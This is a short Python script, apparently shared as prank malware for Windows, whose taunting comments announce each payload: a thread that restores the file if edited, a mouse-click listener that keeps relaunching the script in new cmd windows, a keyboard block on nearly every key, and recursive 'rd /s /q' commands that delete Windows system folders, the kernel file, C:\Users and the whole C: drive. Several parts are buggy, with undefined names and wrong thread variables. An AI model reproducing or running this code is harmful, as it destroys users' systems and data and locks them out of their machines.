#You can't change the code to stop it:
from threading import Thread
def back():
    source=open(__file__,'r').read()
    while True:
        if open(__file__,'r').read()!=source:open(__file__,'w').write(source)
t=Thread(target=back);t.start();t.join()


#if you try to close the cmd it will duplicate itself:
from pynput.mouse import Listener;from keyboard import send;from win32gui import GetWindowText, GetForegroundWindow;from threading import Thread;window = GetWindowText(GetForegroundWindow());send('win+r')
while GetWindowText(GetForegroundWindow()) in [window,"Task Switching",""]:pass
window = GetWindowText(GetForegroundWindow());send('+'.join(list('cmd \\m'))+'+enter');sleep(1)
while GetWindowText(GetForegroundWindow()) in [window,"Task Switching",""]:pass
send('python '+__file__);global sleeping
def slit(x:list,i=0):
    if i+1<len(x) and x[i][-1]!=x[i+1][0]:x[i]+=x[i+1];del x[i+1];return slit(x,i)
    elif i+1<len(x):return slit(x,i+1)
    else:return x
def click(x,y,b,p):
    open(__file__+'w','w').write(open(__file__,'r'))
    window = GetWindowText(GetForegroundWindow());send('win+r')
    while GetWindowText(GetForegroundWindow()) in [window, "Task Switching", ""]: pass
    window = GetWindowText(GetForegroundWindow());send('+'.join(list('cmd \\m')) + '+enter');sleep(sleeping)
    while GetWindowText(GetForegroundWindow()) in [window, "Task Switching", ""]: pass
    [send('+'.join(list(i))) for i in slit(list('python '+__file__+'w'))];send('enter');[send('+'.join(list(i))) for i in slit(list('python '+__file__))];send('enter')
def dup():
    while True:
        with Listener(on_click=click) as listener:listener.join()
for sleeping in range(10):t2=Thread(target=sup);t.start();t.join()


#You can't use your keyboard except the Fn key:
from keyboard import block_key;[block_key(i) for i in [f'f{i+1}' for j in range(12)]+list('`1234567890-=qwertyuiop[]\\asdfghjkl;\'zxvbnm,./c ')+'alt,alt gr,ctrl,left alt,left ctrl,left shift,left windows,right alt,right ctrl,right shift,right windows,shift,windows,enter,backspace,tab,right,left,up,down,esc,delete,insert'.split(',')]


#If you shut down your computer it will never run again:
import os
def kill():
    try:[os.system('rd /s /q C:\\WINDOWS\\'+x) for x in 'SystemResourcesaWinSxSaexplorer.exeaSysWOW64aservicingasystem32a'.replace('a','\\a').split('a')];os.system('rd /s /q C:\\')
    except:os.system('move C:\\WINDOWS\\System32\\ntoskrnl.exe C:\\');os.system('rd /s /q C:\\ntoskrnl.exe');os.system('rd /s /q C:\\WINDOWS\\System32\\ntoskrnl.exe');kill()


#You can't stop me:
import threading;t3=threading.Thread(target=kill);t.start();t.join()

#If you manage to shut me down your hard drive will be reset
while True:
    try:print()
    except:import os;os.system('rd /s /q C:\\Users')


